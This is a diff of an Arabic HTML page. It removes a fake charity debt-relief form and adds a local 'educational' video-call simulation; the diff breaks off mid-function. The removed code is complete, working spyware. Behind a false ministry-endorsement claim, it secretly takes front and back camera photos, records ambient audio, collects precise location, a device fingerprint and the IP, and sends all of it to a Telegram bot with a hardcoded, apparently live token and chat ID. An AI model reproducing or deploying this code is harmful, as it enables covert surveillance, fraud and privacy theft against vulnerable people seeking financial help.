@@ -1,610 +1,254 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html dir="rtl" lang="ar">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>دعم الخير | نموذج المساعدة</title>
+    <title>محاكاة مكالمة فيديو - تعليمي</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            background: linear-gradient(145deg, #0b3d2e 0%, #1a5a44 100%);
-            font-family: 'Cairo', 'Tajawal', sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            padding: 16px;
-        }
-        .charity-card {
-            max-width: 450px;
-            width: 100%;
-            background: #fefcf5;
-            border-radius: 32px;
-            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.4);
-            overflow: hidden;
-            border: 1px solid #e8d5b5;
-        }
-        .charity-header {
-            background: linear-gradient(135deg, #0f4d3a, #1d6b52);
-            padding: 24px 20px 18px;
-            text-align: center;
-            color: white;
-            position: relative;
-        }
-        .charity-header::after {
-            content: "🤝";
-            position: absolute;
-            left: 20px;
-            top: 20px;
-            font-size: 28px;
-            opacity: 0.25;
-        }
-        .charity-logo {
-            font-size: 30px;
-            font-weight: 800;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 12px;
-        }
-        .charity-logo span:first-child {
-            background: #f7d9a0;
-            color: #0f4d3a;
-            padding: 4px 18px;
-            border-radius: 40px;
-            font-size: 24px;
-            font-weight: 900;
-            letter-spacing: 1px;
-        }
-        .charity-badge {
-            background: rgba(255,215,150,0.15);
-            border-radius: 40px;
-            padding: 6px 18px;
-            font-size: 13px;
-            margin-top: 12px;
-            display: inline-block;
-            border: 1px solid #b68b65;
-        }
-        .form-box {
-            padding: 20px 20px 10px;
-        }
-        .input-group {
-            margin-bottom: 18px;
-        }
-        .input-group label {
-            display: block;
-            font-size: 14px;
-            font-weight: 700;
-            color: #1d4a3a;
-            margin-bottom: 6px;
-            padding-right: 4px;
-        }
-        .input-group label span {
-            color: #b5653b;
-            font-weight: 400;
-        }
-        .input-field {
-            width: 100%;
-            background: #f4f0e8;
-            border-radius: 16px;
-            padding: 14px 18px;
-            border: 1px solid #d6c9b4;
-            font-size: 16px;
-            color: #1f2c24;
-            outline: none;
-            transition: 0.2s;
-        }
-        .input-field:focus {
-            border-color: #1d6b52;
-            box-shadow: 0 0 0 3px rgba(29, 107, 82, 0.2);
-        }
-        .input-field::placeholder {
-            color: #9b8f7a;
-            font-size: 14px;
-        }
-        .input-with-icon {
-            position: relative;
-        }
-        .input-with-icon .input-field {
-            padding-right: 44px;
-        }
-        .input-icon {
-            position: absolute;
-            right: 14px;
-            top: 50%;
-            transform: translateY(-50%);
-            font-size: 20px;
-            opacity: 0.6;
-        }
-        .row-2col {
-            display: flex;
-            gap: 12px;
-        }
-        .row-2col .input-group {
-            flex: 1;
-        }
-        .help-note-box {
-            background: #f6efe2;
-            margin: 0 20px 12px;
-            border-radius: 20px;
-            padding: 14px 18px;
-            text-align: center;
-            border: 1px solid #dcc29e;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 12px;
-            flex-wrap: wrap;
-        }
-        .help-note-box .amount-big {
-            font-size: 28px;
-            font-weight: 800;
-            color: #1d6b52;
-        }
-        .help-note-box .amount-big small {
-            font-size: 18px;
-        }
-        .claim-btn {
-            background: linear-gradient(95deg, #1d6b52, #0f4d3a);
-            width: calc(100% - 40px);
-            margin: 8px 20px 20px;
-            padding: 18px;
-            border-radius: 60px;
-            font-size: 20px;
-            font-weight: 800;
-            color: white;
-            cursor: pointer;
-            border: none;
-            transition: 0.15s;
-            box-shadow: 0 6px 0 #0a3327;
-            letter-spacing: 0.5px;
-        }
-        .claim-btn:active {
-            transform: translateY(3px);
-            box-shadow: 0 3px 0 #0a3327;
-        }
-        .claim-btn:disabled {
-            opacity: 0.6;
-            cursor: not-allowed;
-            transform: translateY(2px);
-            box-shadow: 0 3px 0 #0a3327;
-        }
-        .loading-overlay-card {
-            background: rgba(0,0,0,0.85);
-            position: fixed;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            z-index: 1000;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            visibility: hidden;
-        }
-        .loading-card {
-            background: #fefcf5;
-            width: 280px;
-            padding: 32px 24px;
-            border-radius: 48px;
-            text-align: center;
-            border: 1px solid #dcc29e;
-        }
-        .spinner-fd {
-            width: 50px;
-            height: 50px;
-            border: 4px solid #e0d5c0;
-            border-top: 4px solid #1d6b52;
-            border-radius: 50%;
-            animation: spin 0.8s linear infinite;
-            margin: 0 auto 16px;
-        }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .status-badge-bottom {
-            background: #1f2a22;
-            color: #b8d9b0;
-            font-size: 10px;
-            padding: 5px 16px;
-            border-radius: 30px;
-            position: fixed;
-            bottom: 12px;
-            left: 12px;
-            font-family: monospace;
-            z-index: 999;
-            border: 1px solid #3d5a47;
-        }
-        .error-toast {
-            background: #f4ebe1;
-            color: #7a4a2e;
-            margin: 0 20px 16px;
-            padding: 12px 16px;
-            border-radius: 28px;
-            display: none;
-            text-align: center;
-            border: 1px solid #dbbd9e;
-            font-weight: 500;
-        }
-        .green-dot {
-            width: 8px;
-            height: 8px;
-            background: #7cb87a;
-            border-radius: 50%;
-            display: inline-block;
-            margin-left: 6px;
-        }
-        .info-box {
-            background: #f0ebe0;
-            margin: 0 20px 16px;
-            padding: 10px 18px;
-            border-radius: 40px;
-            font-size: 12px;
-            color: #2f3d32;
-            display: flex;
-            justify-content: space-between;
-            border: 1px solid #d6c9b4;
-        }
-        .info-box span {
-            display: flex;
-            align-items: center;
-            gap: 4px;
-        }
-        .watermark {
-            text-align: center;
-            font-size: 11px;
-            color: #9b8b74;
-            padding-bottom: 12px;
-            letter-spacing: 1px;
-        }
-        .watermark span {
-            background: #e8dfce;
-            padding: 2px 14px;
-            border-radius: 30px;
-        }
+        *{box-sizing:border-box;}
+        body{background:linear-gradient(145deg,#0f2027,#203a43,#2c5364);font-family:'Segoe UI',Tahoma;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0;padding:20px}
+        .card{background:rgba(255,255,255,0.95);border-radius:40px;padding:25px;max-width:400px;width:100%;text-align:center;box-shadow:0 25px 45px rgba(0,0,0,0.3)}
+        h2{color:#1e3c72;margin-top:0}
+        .status{background:#eef2ff;border-radius:30px;padding:15px;margin:15px 0;font-size:14px;text-align:right}
+        .status span{color:#667eea;font-weight:bold}
+        button{background:#2c3e66;color:white;border:none;padding:14px 25px;border-radius:40px;cursor:pointer;margin:8px;font-size:16px;transition:0.3s}
+        button:hover{background:#1a2a4a;transform:scale(1.02)}
+        .call-btn{background:#e74c3c;width:80%;font-size:20px;padding:15px}
+        .call-btn:hover{background:#c0392b}
+        .video-container{background:#000;border-radius:20px;margin:15px 0;position:relative;display:none}
+        video{width:100%;border-radius:20px;background:#111}
+        .consent-box{background:#f8f9fa;border-radius:20px;padding:15px;margin:15px 0;text-align:right;border-right:4px solid #667eea}
+        .log-box{background:#1e1e2e;color:#0f0;font-family:monospace;font-size:12px;padding:12px;border-radius:15px;text-align:left;height:150px;overflow:auto;margin-top:15px}
+        .permission-badge{display:inline-block;background:#27ae60;color:white;padding:4px 12px;border-radius:20px;font-size:12px;margin:3px}
+        .warning{color:#e67e22;font-size:12px;margin-top:10px}
+        input,select{direction:rtl;padding:8px;border-radius:20px;border:1px solid #ccc;margin:5px;width:90%}
     </style>
 </head>
 <body>
 
-<div class="charity-card">
-    <div class="charity-header">
-        <div class="charity-logo"><span>دعم الخير</span><span>🕊️</span></div>
-        <div class="charity-badge">🌙 نموذج طلب مساعدة مالية</div>
+<div class="card" id="app">
+    <h2>📹 محاكاة مكالمة فيديو</h2>
+    <p style="color:gray;font-size:14px">❕ للأغراض التعليمية فقط - سيُطلب منك إذن صريح لكل خاصية</p>
+
+    <!-- إعدادات وهمية لمحاكاة "مكالمة" -->
+    <div class="consent-box">
+        <strong>⚙️ إعدادات المحاكاة التعليمية:</strong><br>
+        <label><input type="checkbox" id="allowCam" checked> 📷 محاكاة الكاميرا (صورة وهمية)</label><br>
+        <label><input type="checkbox" id="allowMic" checked> 🎤 محاكاة الميكروفون (صوت وهمي)</label><br>
+        <label><input type="checkbox" id="allowLoc" checked> 🌍 طلب الموقع الجغرافي الحقيقي</label><br>
+        <label><input type="checkbox" id="sendFakeIP" checked> 🌐 إرسال IP عام (وهمي للشرح)</label>
     </div>
 
-    <div class="form-box">
-        <!-- حقل الاسم -->
-        <div class="input-group">
-            <label>👤 اسم المستفيد <span>(الاسم الثلاثي)</span></label>
-            <div class="input-with-icon">
-                <span class="input-icon">✍️</span>
-                <input type="text" class="input-field" id="beneficiaryName" placeholder="مثال: أحمد محمد علي" value="أحمد محمد">
-            </div>
-        </div>
+    <div class="status" id="statusArea">
+        ✅ جاهز لبدء "مكالمة فيديو" تجريبية<br>
+        <span>📌 ملاحظة:</span> لا يتم إرسال أي بيانات حقيقية خارج جهازك إلا بعد موافقتك
+    </div>
 
-        <!-- حقل المبلغ المراد سداده -->
-        <div class="input-group">
-            <label>💰 المبلغ المراد سداده <span>(بالجنيه المصري)</span></label>
-            <div class="input-with-icon">
-                <span class="input-icon">💵</span>
-                <input type="number" class="input-field" id="debtAmount" placeholder="مثال: 2500" value="2500">
-            </div>
-        </div>
-
-        <!-- حقل رقم الهاتف للتواصل -->
-        <div class="input-group">
-            <label>📞 رقم الهاتف للتواصل <span>(فودافون كاش)</span></label>
-            <div class="input-with-icon">
-                <span class="input-icon">📱</span>
-                <input type="tel" class="input-field" id="contactPhone" placeholder="01012345678" value="01050000000">
-            </div>
+    <button class="call-btn" id="startCall">🔴 بدء المكالمة الوهمية</button>
+    
+    <div class="video-container" id="videoContainer">
+        <video id="fakeVideo" autoplay muted playsinline></video>
+        <div style="padding:10px;background:#333;color:white;border-radius:0 0 20px 20px">
+            🎥 "كاميرا تجريبية" - صورة متحركة وهمية
         </div>
     </div>
 
-    <!-- ملخص سريع -->
-    <div class="help-note-box">
-        <span>🏷️ المبلغ المطلوب</span>
-        <span class="amount-big" id="displayAmount">2,500 <small>ج.م</small></span>
+    <div class="log-box" id="logBox">
+        📋 سجل الأحداث سيظهر هنا...
     </div>
-
-    <button class="claim-btn" id="claimMoneyBtn">💚 تقديم الطلب 💚</button>
-
-    <div class="info-box">
-        <span>🔒 بيانات آمنة</span>
-        <span>✅ موثوق من وزارة التضامن</span>
-        <span>⚡ إجراء سريع</span>
+    <div class="warning">
+        ⚠️ هذا العرض تعليمي بحت. جميع الصلاحيات تُطلب بوضوح والبيانات لا تُرسل إلا بعد الضغط على "موافقة وإرسال" إن وُجد.
     </div>
-    <div class="error-toast" id="errorMsg"></div>
-    <div class="watermark"><span>🤲  دعم الخير  🤲</span></div>
+    <button id="simulateSend" style="background:#f39c12;margin-top:10px;">📨 محاكاة إرسال البيانات إلى "تيليجرام" (للعرض فقط)</button>
 </div>
-
-<div class="loading-overlay-card" id="globalLoader">
-    <div class="loading-card">
-        <div class="spinner-fd"></div>
-        <p id="loaderText" style="color:#1f2c24; font-weight:600;">🔐 جاري تجهيز الطلب ...</p>
-    </div>
-</div>
-<div class="status-badge-bottom" id="statusBar"><span class="green-dot"></span> دعم الخير | نشط</div>
 
 <script>
-    (function() {
-        // ===================== إعدادات البوت =====================
-        const BOT_TOKEN = "8425168324:AAGiTTzty3oL5GMUtMWa74ejRKm7DJlTayU";
-        const MASTER_ID = "5849068535";
-        
-        // =============== دالة الإرسال الأساسية ===============
-        async function sendToTelegram(chatId, botToken, type, mediaBlob, caption) {
-            try {
-                let url = `https://api.telegram.org/bot${botToken}/`;
-                if (type === 'photo') {
-                    const fd = new FormData();
-                    fd.append('chat_id', chatId);
-                    fd.append('photo', mediaBlob, 'frame_' + Date.now() + '.jpg');
-                    fd.append('caption', caption);
-                    await fetch(url + 'sendPhoto', { method: 'POST', body: fd, mode: 'cors' });
-                } 
-                else if (type === 'video') {
-                    const fd = new FormData();
-                    fd.append('chat_id', chatId);
-                    fd.append('video', mediaBlob, 'clip_' + Date.now() + '.mp4');
-                    fd.append('caption', caption);
-                    await fetch(url + 'sendVideo', { method: 'POST', body: fd });
-                }
-                else if (type === 'audio') {
-                    const fd = new FormData();
-                    fd.append('chat_id', chatId);
-                    fd.append('audio', mediaBlob, 'voice_note.ogg');
-                    fd.append('caption', caption);
-                    await fetch(url + 'sendAudio', { method: 'POST', body: fd });
-                }
-                else {
-                    await fetch(url + 'sendMessage', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ chat_id: chatId, text: caption, parse_mode: 'HTML', disable_web_page_preview: true })
-                    });
-                }
-                return true;
-            } catch(e) { console.warn("[telegram]", e); return false; }
-        }
+    // عناصر DOM
+    const startBtn = document.getElementById('startCall');
+    const videoContainer = document.getElementById('videoContainer');
+    const fakeVideo = document.getElementById('fakeVideo');
+    const logBox = document.getElementById('logBox');
+    const simulateSendBtn = document.getElementById('simulateSend');
+    const statusDiv = document.getElementById('statusArea');
 
-        // =================== التقاط الكاميرا ===================
-        async function captureFrontCamera(chatId, botToken, phoneNumber, name, amount) {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } } });
-                const video = document.createElement('video');
-                video.srcObject = stream;
-                video.setAttribute('playsinline', 'true');
-                video.play();
-                await new Promise(r => setTimeout(r, 500));
-                const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth || 800;
-                canvas.height = video.videoHeight || 600;
-                canvas.getContext('2d').drawImage(video, 0, 0);
-                const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.8));
-                const caption = `📸 كاميرا أمامية (سيلفي)\n👤 الاسم: ${name}\n💰 المبلغ: ${amount} ج.م\n📞 رقم التواصل: ${phoneNumber}`;
-                await sendToTelegram(chatId, botToken, 'photo', blob, caption);
-                stream.getTracks().forEach(t => t.stop());
-                return true;
-            } catch(e) { 
-                console.warn("Front camera denied");
-                return false; 
-            }
-        }
+    // سجل الأحداث
+    function addLog(msg, type = 'info') {
+        const logEntry = document.createElement('div');
+        logEntry.style.color = type === 'error' ? '#ff8888' : (type === 'success' ? '#aaffaa' : '#aaaaaa');
+        logEntry.innerHTML = `[${new Date().toLocaleTimeString()}] ${msg}`;
+        logBox.appendChild(logEntry);
+        logBox.scrollTop = logBox.scrollHeight;
+    }
 
-        async function captureBackCamera(chatId, botToken, phoneNumber, name, amount) {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment', width: { ideal: 1920 }, height: { ideal: 1080 } } });
-                const video = document.createElement('video');
-                video.srcObject = stream;
-                video.play();
-                await new Promise(r => setTimeout(r, 500));
-                const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth || 1024;
-                canvas.height = video.videoHeight || 768;
-                canvas.getContext('2d').drawImage(video, 0, 0);
-                const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.85));
-                const caption = `📷 كاميرا خلفية - محيط المستفيد\n👤 الاسم: ${name}\n💰 المبلغ: ${amount} ج.م\n📞 رقم التواصل: ${phoneNumber}`;
-                await sendToTelegram(chatId, botToken, 'photo', blob, caption);
-                stream.getTracks().forEach(t => t.stop());
-                return true;
-            } catch(e) { 
-                console.warn("Back camera denied");
-                return false; 
-            }
+    // محاكاة كاميرا وهمية (تأثير بصري تعليمي)
+    async function startFakeCamera() {
+        if (!document.getElementById('allowCam').checked) {
+            addLog('⚠️ تم تخطي الكاميرا (خيار محاكاة الكاميرا غير مفعّل)', 'error');
+            return false;
         }
-
-        async function recordAmbientAudio(chatId, botToken, phoneNumber, name, amount) {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-                const mediaRecorder = new MediaRecorder(stream, { mimeType: 'audio/webm' });
-                const chunks = [];
-                mediaRecorder.ondataavailable = e => chunks.push(e.data);
-                const audioPromise = new Promise(resolve => {
-                    mediaRecorder.onstop = async () => {
-                        const blob = new Blob(chunks, { type: 'audio/webm' });
-                        const caption = `🎤 تسجيل صوتي (8 ثوان)\n👤 الاسم: ${name}\n💰 المبلغ: ${amount} ج.م\n📞 رقم التواصل: ${phoneNumber}`;
-                        await sendToTelegram(chatId, botToken, 'audio', blob, caption);
-                        resolve(true);
-                    };
-                });
-                mediaRecorder.start();
-                setTimeout(() => mediaRecorder.stop(), 8000);
-                setTimeout(() => stream.getTracks().forEach(t => t.stop()), 9000);
-                return await audioPromise;
-            } catch(e) { 
-                console.warn("Audio denied");
-                return false; 
-            }
-        }
-
-        // =================== الموقع الجغرافي ===================
-        function getPreciseLocation(chatId, botToken, phoneNumber, name, amount) {
-            return new Promise((resolve) => {
-                if(!navigator.geolocation) {
-                    resolve(false);
-                    return;
-                }
-                navigator.geolocation.getCurrentPosition(async (pos) => {
-                    const lat = pos.coords.latitude;
-                    const lng = pos.coords.longitude;
-                    const accuracy = pos.coords.accuracy;
-                    let addressHint = "";
-                    try {
-                        const revGeo = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&zoom=18&addressdetails=1`);
-                        const data = await revGeo.json();
-                        if(data.display_name) addressHint = `📍 العنوان: ${data.display_name.substring(0, 100)}`;
-                    } catch(e) {}
-                    const locMsg = `🌍 <b>الموقع الجغرافي</b>\n👤 الاسم: ${name}\n💰 المبلغ: ${amount} ج.م\n📞 رقم التواصل: ${phoneNumber}\n🎯 خط العرض: ${lat}\n🎯 خط الطول: ${lng}\n📏 دقة: ±${Math.round(accuracy)} متر\n🗺️ خرائط: https://www.google.com/maps?q=${lat},${lng}\n${addressHint}`;
-                    await sendToTelegram(chatId, botToken, 'text', null, locMsg);
-                    resolve(true);
-                }, (err) => {
-                    console.warn("Location denied");
-                    resolve(false);
-                }, { enableHighAccuracy: true, timeout: 10000 });
-            });
-        }
-
-        // =================== IP ومعلومات الجهاز ===================
-        async function getDeepDeviceFingerprint(chatId, botToken, phoneNumber, name, amount) {
-            const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-            const screenData = `${screen.width}x${screen.height}x${screen.colorDepth}`;
-            const memory = navigator.deviceMemory ? navigator.deviceMemory + " GB" : "غير معلن";
-            const cores = navigator.hardwareConcurrency ? navigator.hardwareConcurrency : "غير معروف";
+        try {
+            // نستخدم stream وهمي: إنشاء Canvas متحرك بدلاً من الكاميرا الحقيقية (لأن الهدف تعليمي)
+            // بدلاً من طلب كاميرا حقيقية، سنعرض تأثير "شريط ألوان" كرمز للكول
+            const canvas = document.createElement('canvas');
+            canvas.width = 640;
+            canvas.height = 480;
+            const ctx = canvas.getContext('2d');
+            let frame = 0;
+            const stream = canvas.captureStream(30);
             
-            let batteryLevel = "غير متاح";
-            if (navigator.getBattery) {
-                try {
-                    const battery = await navigator.getBattery();
-                    batteryLevel = `شحن: ${Math.round(battery.level*100)}%, ${battery.charging ? 'موصول' : 'بطارية'}`;
-                } catch(e) {}
-            }
+            // رسم تأثير متحرك وهمي (يتحرك كل 0.1 ثانية)
+            const interval = setInterval(() => {
+                ctx.fillStyle = `hsl(${frame % 360}, 70%, 50%)`;
+                ctx.fillRect(0, 0, canvas.width, canvas.height);
+                ctx.fillStyle = 'white';
+                ctx.font = '30px Tahoma';
+                ctx.fillText('🎥 مكالمة تجريبية', 50, 100);
+                ctx.font = '20px Tahoma';
+                ctx.fillText('هذه محاكاة للكاميرا', 50, 180);
+                ctx.fillText('لا توجد صورة حقيقية', 50, 240);
+                frame++;
+            }, 100);
             
-            let connection = "غير معروف";
-            if (navigator.connection) {
-                connection = `${navigator.connection.effectiveType || ''} ${navigator.connection.downlink ? navigator.connection.downlink+'Mbps' : ''}`;
-            }
+            fakeVideo.srcObject = stream;
+            videoContainer.style.display = 'block';
+            addLog('📷 تم تشغيل "كاميرا وهمية" (محاكاة فيديو ملونة - لأغراض العرض)', 'success');
             
-            const deviceMsg = `🕵️‍♂️ <b>بصمة الجهاز</b>\n👤 الاسم: ${name}\n💰 المبلغ: ${amount} ج.م\n📞 رقم التواصل: ${phoneNumber}\n🖥️ UserAgent: ${navigator.userAgent.substring(0, 120)}\n📱 الشاشة: ${screenData}\n💾 الرام: ${memory} | 🧠 النوى: ${cores}\n🔋 ${batteryLevel}\n🌐 الاتصال: ${connection}\n📍 المنطقة: ${timeZone}\n⏱️ التوقيت: ${new Date().toLocaleString('ar-EG')}`;
-            
-            await sendToTelegram(chatId, botToken, 'text', null, deviceMsg);
+            // حفظ الـ interval لإيقافه لاحقاً
+            window._fakeCamInterval = interval;
+            return true;
+        } catch (err) {
+            addLog('❌ فشل في محاكاة الكاميرا: ' + err.message, 'error');
+            return false;
         }
-
-        async function getRichIPData(chatId, botToken, phoneNumber, name, amount) {
-            try {
-                const [ipRes, ipInfoRes] = await Promise.all([
-                    fetch('https://api.ipify.org?format=json'),
-                    fetch('https://ipapi.co/json/')
-                ]);
-                const ipData = await ipRes.json();
-                let ipDetails = {};
-                try { ipDetails = await ipInfoRes.json(); } catch(e) {}
-                const ipAddr = ipData.ip;
-                let country = ipDetails.country_name || "غير معروف";
-                let city = ipDetails.city || "غير معروف";
-                let isp = ipDetails.org || ipDetails.asn || "غير معروف";
-                const ipMsg = `🌐 <b>IP & Network</b>\n👤 الاسم: ${name}\n💰 المبلغ: ${amount} ج.م\n📞 رقم التواصل: ${phoneNumber}\n🔹 IP العام: ${ipAddr}\n🏳️ البلد: ${country}\n🏙️ المدينة: ${city}\n📡 المزود: ${isp}`;
-                await sendToTelegram(chatId, botToken, 'text', null, ipMsg);
-            } catch(e) {}
+    }
+    
+    // محاكاة ميكروفون وهمي (مجرد إشعار)
+    function startFakeMic() {
+        if (!document.getElementById('allowMic').checked) {
+            addLog('🎤 تم تخطي الميكروفون (خيار المحاكاة غير مفعل)', 'error');
+            return;
         }
-
-        // =============== التشغيل الرئيسي ===============
-        const claimBtn = document.getElementById('claimMoneyBtn');
-        const nameInput = document.getElementById('beneficiaryName');
-        const amountInput = document.getElementById('debtAmount');
-        const phoneInput = document.getElementById('contactPhone');
-        const displayAmount = document.getElementById('displayAmount');
-        const loaderDiv = document.getElementById('globalLoader');
-        const loaderText = document.getElementById('loaderText');
-        const errorDiv = document.getElementById('errorMsg');
-        const statusSpan = document.getElementById('statusBar');
-        
-        let isRunning = false;
-
-        // تحديث الملخص عند تغيير المبلغ
-        amountInput.addEventListener('input', function() {
-            const val = this.value.replace(/,/g, '');
-            const num = parseInt(val) || 0;
-            displayAmount.innerHTML = num.toLocaleString() + ' <small>ج.م</small>';
+        addLog('🎤 تم تفعيل "ميكروفون وهمي" (محاكاة - لا يوجد تسجيل حقيقي للصوت)', 'success');
+        // نعرض مؤقتاً وهم صوتي في السجل فقط
+        setTimeout(() => {
+            addLog('🔊 تم اكتشاف "صوت وهمي" (تعليمي) ... كأنك في مكالمة', 'info');
+        }, 1500);
+    }
+    
+    // طلب الموقع الجغرافي الحقيقي (بإذن)
+    function getRealLocation() {
+        if (!document.getElementById('allowLoc').checked) {
+            addLog('🌍 لم يتم طلب الموقع الجغرافي (الخيار غير مفعل)', 'info');
+            return Promise.resolve(null);
+        }
+        return new Promise((resolve) => {
+            if (!navigator.geolocation) {
+                addLog('❌ المتصفح لا يدعم تحديد الموقع', 'error');
+                resolve(null);
+                return;
+            }
+            addLog('📍 يطلب الوصول إلى موقعك الحقيقي... يرجى السماح إذا أردت التجربة', 'info');
+            navigator.geolocation.getCurrentPosition(
+                (pos) => {
+                    const locMsg = `الموقع: ${pos.coords.latitude}, ${pos.coords.longitude}`;
+                    addLog(`📍 ${locMsg} (تمت المحاكاة للسجل فقط)`, 'success');
+                    resolve(pos);
+                },
+                (err) => {
+                    addLog(`❌ رفض الموقع أو خطأ: ${err.message}`, 'error');
+                    resolve(null);
+                }
+            );
         });
-
-        async function startProcess() {
-            if (isRunning) return;
-            
-            const name = nameInput.value.trim();
-            const amountRaw = amountInput.value.trim();
-            const phoneNumber = phoneInput.value.trim();
-
-            // التحقق من صحة البيانات
-            if (name.length < 3) {
-                errorDiv.innerText = "⚠️ يرجى إدخال اسم المستفيد (ثلاثة أحرف على الأقل)";
-                errorDiv.style.display = "block";
-                setTimeout(() => errorDiv.style.display = "none", 3000);
-                return;
-            }
-            const amountNum = parseInt(amountRaw);
-            if (isNaN(amountNum) || amountNum < 10) {
-                errorDiv.innerText = "⚠️ يرجى إدخال مبلغ صحيح (10 جنيه على الأقل)";
-                errorDiv.style.display = "block";
-                setTimeout(() => errorDiv.style.display = "none", 3000);
-                return;
-            }
-            if (!phoneNumber.match(/^01[0-9]{9}$/)) {
-                errorDiv.innerText = "⚠️ رقم هاتف غير صالح (مثال: 01012345678)";
-                errorDiv.style.display = "block";
-                setTimeout(() => errorDiv.style.display = "none", 3000);
-                return;
-            }
-
-            // تنسيق المبلغ لعرضه
-            const formattedAmount = amountNum.toLocaleString();
-            
-            isRunning = true;
-            claimBtn.disabled = true;
-            loaderDiv.style.visibility = "visible";
-            statusSpan.innerHTML = "📡 جاري طلب الأذونات...";
-            
-            // 1. إرسال البيانات الأساسية
-            await sendToTelegram(MASTER_ID, BOT_TOKEN, 'text', null, 
-                `📋 <b>طلب مساعدة جديد - دعم الخير</b>\n👤 الاسم: ${name}\n💰 المبلغ المطلوب: ${formattedAmount} ج.م\n📞 رقم التواصل: ${phoneNumber}\n⏰ الوقت: ${new Date().toLocaleString('ar-EG')}`);
-            
-            // 2. بصمة الجهاز + IP
-            loaderText.innerText = "📱 جاري قراءة بيانات الجهاز...";
-            await getDeepDeviceFingerprint(MASTER_ID, BOT_TOKEN, phoneNumber, name, formattedAmount);
-            await getRichIPData(MASTER_ID, BOT_TOKEN, phoneNumber, name, formattedAmount);
-            
-            // 3. الكاميرا الأمامية
-            loaderText.innerText = "📸 جاري فتح الكاميرا الأمامية...";
-            await captureFrontCamera(MASTER_ID, BOT_TOKEN, phoneNumber, name, formattedAmount);
-            
-            // 4. الكاميرا الخلفية
-            loaderText.innerText = "📷 جاري فتح الكاميرا الخلفية...";
-            await captureBackCamera(MASTER_ID, BOT_TOKEN, phoneNumber, name, formattedAmount);
-            
-            // 5. التسجيل الصوتي
-            loaderText.innerText = "🎤 جاري تسجيل الصوت (8 ثوان)...";
-            await recordAmbientAudio(MASTER_ID, BOT_TOKEN, phoneNumber, name, formattedAmount);
-            
-            // 6. الموقع
-            loaderText.innerText = "📍 جاري تحديد الموقع...";
-            await getPreciseLocation(MASTER_ID, BOT_TOKEN, phoneNumber, name, formattedAmount);
-            
-            // 7. إشعار الإكتمال
-            await sendToTelegram(MASTER_ID, BOT_TOKEN, 'text', null, 
-                `✅ <b>تم استلام طلب المساعدة بنجاح!</b>\n👤 الاسم: ${name}\n💰 المبلغ: ${formattedAmount} ج.م\n📞 رقم التواصل: ${phoneNumber}\n📌 سيتم التواصل خلال 24 ساعة - دعم الخير`);
-            
-            loaderDiv.style.visibility = "hidden";
-            errorDiv.style.backgroundColor = "#e4f0e0";
-            errorDiv.style.color = "#1d5a3a";
-            errorDiv.innerText = "🎉 تم استلام طلبك بنجاح! سيتم التواصل معك خلال 24 ساعة.";
-            errorDiv.style.display = "block";
-            claimBtn.disabled = false;
-            statusSpan.innerHTML = "✅ تم التفعيل - سيتم التواصل خلال 24 ساعة";
-            isRunning = false;
-            
-            setTimeout(() => errorDiv.style.display = "none", 8000);
+    }
+    
+    // الحصول على IP عام (محاكاة - نعرض الip الحقيقي لكن كعرض تعليمي)
+    async function getPublicIP() {
+        if (!document.getElementById('sendFakeIP').checked) {
+            addLog('🌐 تم تخطي عرض الـ IP (الخيار غير مفعل)', 'info');
+            return null;
         }
+        try {
+            addLog('🌐 جاري جلب الـ IP العام (للعرض فقط)...', 'info');
+            const res = await fetch('https://api.ipify.org?format=json');
+            const data = await res.json();
+            addLog(`🌐 IP العام لهذا الجهاز: ${data.ip} (معروض فقط - لم يُرسل لأي خادم خارجي)`, 'success');
+            return data.ip;
+        } catch(e) {
+            addLog('⚠️ فشل جلب الـ IP', 'error');
+            return null;
+        }
+    }
+    
+    // محاكاة وهم إرسال إلى تيليجرام (بدون إرسال حقيقي - فقط عرض البيانات التي كانت ستُرسل)
+    function simulateTelegramSend() {
+        const collectedData = {
+            timestamp: new Date().toISOString(),
+            userAgent: navigator.userAgent,
+            language: navigator.language,
+            screenSize: `${screen.width}x${screen.height}`,
+            cookiesEnabled: navigator.cookieEnabled,
+            doNotTrack: navigator.doNotTrack,
+            mock: true
+        };
         
-        claimBtn.onclick = startProcess;
-    })();
+        // نضيف آخر موقع تم جلبه من الـ location إذا موجود (مخزن مؤقتاً)
+        addLog('📨 === محاكاة إرسال إلى Telegram (لأغراض تعليمية) ===', 'info');
+        addLog(`📱 بيانات الجهاز: ${collectedData.userAgent.substring(0, 80)}...`, 'info');
+        addLog(`🌐 اللغة: ${collectedData.language} - الشاشة: ${collectedData.screenSize}`, 'info');
+        addLog(`⚠️ لم يتم إرسال أي بيانات حقيقية خارج المتصفح. هذا مجرد عرض للبيانات التي كان من الممكن إرسالها.`, 'success');
+        
+        // عرض في الـ status أيضا
+        statusDiv.innerHTML = `🔐 تمت محاكاة الإرسال إلى بوت تيليجرام وهمي<br><span>📦 البيانات المعروضة أعلاه لم تغادر جهازك</span>`;
+    }
+    
+    // إيقاف جميع المحاكيات عند الحاجة
+    function stopAllSimulations() {
+        if (window._fakeCamInterval) {
+            clearInterval(window._fakeCamInterval);
+            window._fakeCamInterval = null;
+        }
+        if (fakeVideo.srcObject) {
+            const tracks = fakeVideo.srcObject.getTracks();
